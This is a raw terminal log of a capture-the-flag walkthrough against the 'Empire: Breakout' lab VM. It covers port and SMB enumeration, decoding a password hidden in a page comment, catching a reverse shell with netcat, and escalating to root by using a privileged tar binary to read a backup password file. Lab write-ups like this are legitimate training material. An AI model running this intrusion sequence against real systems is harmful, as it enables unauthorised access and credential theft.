EMPIRE: BREAKOUT

┌──(root㉿kali)-[/home/kali]
└─# nmap -T4 -sV -A 192.168.64.132
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-04 19:50 EST
Nmap scan report for 192.168.64.132
Host is up (0.00096s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
MAC Address: 00:0C:29:CB:1A:B4 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-05T00:50:40
|_  start_date: N/A
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.95 ms 192.168.64.132

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.65 seconds
                                                             
┌──(root㉿kali)-[/home/kali]
└─# dirb http://192.168.64.132

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jan  4 19:58:49 2023
URL_BASE: http://192.168.64.132/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                                                             GENERATED WORDS: 4612

---- Scanning URL: http://192.168.64.132/ ----
                                                                             + http://192.168.64.132/index.html (CODE:200|SIZE:11159)                    
                                                                             ==> DIRECTORY: http://192.168.64.132/manual/
+ http://192.168.64.132/server-status (CODE:403|SIZE:279)                   
                                                                            
---- Entering directory: http://192.168.64.132/manual/ ----

-----------------
END_TIME: Wed Jan  4 20:06:03 2023
DOWNLOADED: 378184 - FOUND: 83


http://192.168.64.132/

view-source:http://192.168.64.132/

<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.


-->

PASSWORD IS:".2uqPEfj3D<P'a-3"

https://192.168.64.132:20000/

┌──(root㉿kali)-[/home/kali]
└─# enum4linux -a 192.168.64.132
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Jan  4 21:13:22 2023

 =========================================( Target Information )=========================================                                                                                   
                                                                                              
Target ........... 192.168.64.132                                                             
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.64.132 )===========================                                                                                   
                                                                                              
                                                                                              
[+] Got domain/workgroup name: WORKGROUP                                                      
                                                                                              
                                                                                              
 ===============================( Nbtstat Information for 192.168.64.132 )===============================                                                                                   
                                                                                              
Looking up status of 192.168.64.132                                                           
        BREAKOUT        <00> -         B <ACTIVE>  Workstation Service
        BREAKOUT        <03> -         B <ACTIVE>  Messenger Service
        BREAKOUT        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 192.168.64.132 )==================================                                                                                    
                                                                                              
                                                                                              
[+] Server 192.168.64.132 allows sessions using username '', password ''                      
                                                                                              
                                                                                              
 ===============================( Getting domain SID for 192.168.64.132 )===============================                                                                                    
                                                                                              
Domain Name: WORKGROUP                                                                        
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                          
                                                                                              
                                                                                              
 ==================================( OS information on 192.168.64.132 )==================================                                                                                   
                                                                                              
                                                                                              
[E] Can't get OS info with smbclient                                                          
                                                                                              
                                                                                              
[+] Got OS info for 192.168.64.132 from srvinfo:                                              
        BREAKOUT       Wk Sv PrQ Unx NT SNT Samba 4.13.5-Debian                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 ======================================( Users on 192.168.64.132 )======================================                                                                                    
                                                                                              
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                       
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ================================( Share Enumeration on 192.168.64.132 )================================                                                                                    
                                                                                              
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                         

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.13.5-Debian)
Reconnecting with SMB1 for workgroup listing.
protocol negotiation failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.64.132                                                
                                                                                              
//192.168.64.132/print$ Mapping: DENIED Listing: N/A Writing: N/A                             

[E] Can't understand response:                                                                
                                                                                              
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                    
//192.168.64.132/IPC$   Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.64.132 )===========================                                                                                   
                                                                                              
                                                                                              

[+] Attaching to 192.168.64.132 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BREAKOUT
        [+] Builtin

[+] Password Info for Domain: BREAKOUT

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                          
                                                                                              
                                                                                              
Password Complexity: Disabled                                                                 
Minimum Password Length: 5


 ======================================( Groups on 192.168.64.132 )======================================                                                                                   
                                                                                              
                                                                                              
[+] Getting builtin groups:                                                                   
                                                                                              
                                                                                              
[+]  Getting builtin group memberships:                                                       
                                                                                              
                                                                                              
[+]  Getting local groups:                                                                    
                                                                                              
                                                                                              
[+]  Getting local group memberships:                                                         
                                                                                              
                                                                                              
[+]  Getting domain groups:                                                                   
                                                                                              
                                                                                              
[+]  Getting domain group memberships:                                                        
                                                                                              
                                                                                              
 =================( Users on 192.168.64.132 via RID cycling (RIDS: 500-550,1000-1050) )=================                                                                                    
                                                                                              
                                                                                              
[I] Found new SID:                                                                            
S-1-22-1                                                                                      

[I] Found new SID:                                                                            
S-1-5-32                                                                                      

[I] Found new SID:                                                                            
S-1-5-32                                                                                      

[I] Found new SID:                                                                            
S-1-5-32                                                                                      

[I] Found new SID:                                                                            
S-1-5-32                                                                                      

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                   
                                                                                              
S-1-22-1-1000 Unix User\cyber (Local User)                                                    

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                   
                                                                                              
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                             
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-5-21-1683874020-4104641535-3793993001 and logon username '', password ''                                                                                
                                                                                              
S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)                    
S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\None (Domain Group)

 ==============================( Getting printer info for 192.168.64.132 )==============================                                                                                    
                                                                                              
No printers returned.                                                                         


enum4linux complete on Wed Jan  4 21:14:08 2023

                                                                                              
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4242
listening on [any] 4242 ...
connect to [192.168.64.130] from (UNKNOWN) [192.168.64.132] 58010
bash: cannot set terminal process group (1513): Inappropriate ioctl for device
bash: no job control in this shell
cyber@breakout:~$ python3 -c "import pty;pty.spawn(´/bin/bash´)"
python3 -c "import pty;pty.spawn(´/bin/bash´)"
  File "<string>", line 1
    import pty;pty.spawn(´/bin/bash´)
                         ^
SyntaxError: invalid character '´' (U+00B4)
cyber@breakout:~$ python3 -c "import pty;pty.spawn('/bin/bash')"       
python3 -c "import pty;pty.spawn('/bin/bash')"
cyber@breakout:~$ export TERM=xterm
export TERM=xterm
cyber@breakout:~$ 

┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 4242
listening on [any] 4242 ...
connect to [192.168.64.130] from (UNKNOWN) [192.168.64.132] 58010
bash: cannot set terminal process group (1513): Inappropriate ioctl for device
bash: no job control in this shell
cyber@breakout:~$ python3 -c "import pty;pty.spawn(´/bin/bash´)"
python3 -c "import pty;pty.spawn(´/bin/bash´)"
  File "<string>", line 1
    import pty;pty.spawn(´/bin/bash´)
                         ^
SyntaxError: invalid character '´' (U+00B4)
cyber@breakout:~$ python3 -c "import pty;pty.spawn('/bin/bash')"       
python3 -c "import pty;pty.spawn('/bin/bash')"
cyber@breakout:~$ export TERM=xterm
export TERM=xterm
cyber@breakout:~$ ls -al
ls -al
total 568
drwxr-xr-x  8 cyber cyber   4096 Oct 20  2021 .
drwxr-xr-x  3 root  root    4096 Oct 19  2021 ..
-rw-------  1 cyber cyber      0 Oct 20  2021 .bash_history
-rw-r--r--  1 cyber cyber    220 Oct 19  2021 .bash_logout
-rw-r--r--  1 cyber cyber   3526 Oct 19  2021 .bashrc
drwxr-xr-x  2 cyber cyber   4096 Oct 19  2021 .filemin
drwx------  2 cyber cyber   4096 Oct 19  2021 .gnupg
drwxr-xr-x  3 cyber cyber   4096 Oct 19  2021 .local
-rw-r--r--  1 cyber cyber    807 Oct 19  2021 .profile
drwx------  2 cyber cyber   4096 Oct 19  2021 .spamassassin
-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
drwxr-xr-x  2 cyber cyber   4096 Oct 20  2021 .tmp
drwx------ 16 cyber cyber   4096 Oct 19  2021 .usermin
-rw-r--r--  1 cyber cyber     48 Oct 19  2021 user.txt
cyber@breakout:~$ ls -al /var
ls -al /var
total 56
drwxr-xr-x 14 root root  4096 Oct 19  2021 .
drwxr-xr-x 18 root root  4096 Oct 19  2021 ..
drwxr-xr-x  2 root root  4096 Jan  4 20:18 backups
drwxr-xr-x 12 root root  4096 Oct 19  2021 cache
drwxr-xr-x 25 root root  4096 Oct 19  2021 lib
drwxrwsr-x  2 root staff 4096 Apr 10  2021 local
lrwxrwxrwx  1 root root     9 Oct 19  2021 lock -> /run/lock
drwxr-xr-x  8 root root  4096 Jan  4 19:48 log
drwxrwsr-x  2 root mail  4096 Oct 19  2021 mail
drwxr-xr-x  2 root root  4096 Oct 19  2021 opt
lrwxrwxrwx  1 root root     4 Oct 19  2021 run -> /run
drwxr-xr-x  5 root root  4096 Oct 19  2021 spool
drwxrwxrwt  5 root root  4096 Jan  4 19:48 tmp
drwxr-xr-x  3 root root  4096 Jan  4 19:39 usermin
drwx------  3 root bin   4096 Jan  4 19:39 webmin
drwxr-xr-x  3 root root  4096 Oct 19  2021 www
cyber@breakout:~$ ls -al /var/backups
ls -al /var/backups
total 28
drwxr-xr-x  2 root root  4096 Jan  4 20:18 .
drwxr-xr-x 14 root root  4096 Oct 19  2021 ..
-rw-r--r--  1 root root 12732 Oct 19  2021 apt.extended_states.0
-rw-------  1 root root    17 Oct 20  2021 .old_pass.bak
cyber@breakout:~$ .tar -cf backup.tar /var/backups/.old_pass.bak
.tar -cf backup.tar /var/backups/.old_pass.bak
bash: .tar: command not found
cyber@breakout:~$ ./tar -cf backup.tar /var/backups/.old_pass.bak
./tar -cf backup.tar /var/backups/.old_pass.bak
./tar: Removing leading `/' from member names
cyber@breakout:~$ ls
ls
backup.tar  tar  user.txt
cyber@breakout:~$ ./tar -xf backup.tar
./tar -xf backup.tar
cyber@breakout:~$ ls
ls
backup.tar  tar  user.txt  var
cyber@breakout:~$ cd var    
cd var 
cyber@breakout:~/var$ ls
ls
backups
cyber@breakout:~/var$ cd backups
cd backups
cyber@breakout:~/var/backups$ ls
ls
cyber@breakout:~/var/backups$ ls -al
ls -al
total 12
drwxr-xr-x 2 cyber cyber 4096 Jan  4 21:50 .
drwxr-xr-x 3 cyber cyber 4096 Jan  4 21:50 ..
-rw------- 1 cyber cyber   17 Oct 20  2021 .old_pass.bak
cyber@breakout:~/var/backups$ cat old_pass.bak
cat old_pass.bak
cat: old_pass.bak: No such file or directory
cyber@breakout:~/var/backups$ cat .old_pass.bak
cat .old_pass.bak
Ts&4&YurgtRX(=~h
cyber@breakout:~/var/backups$ su root 
su root 
Password: Ts&4&YurgtRX(=~h

root@breakout:/home/cyber/var/backups# whoami
whoami
root
root@breakout:/home/cyber/var/backups# cd /root
cd /root
root@breakout:~# ls
ls
rOOt.txt
root@breakout:~# cat rOOt.txt              
cat rOOt.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
root@breakout:~# date
date
Wed 04 Jan 2023 09:57:30 PM EST
root@breakout:~# 




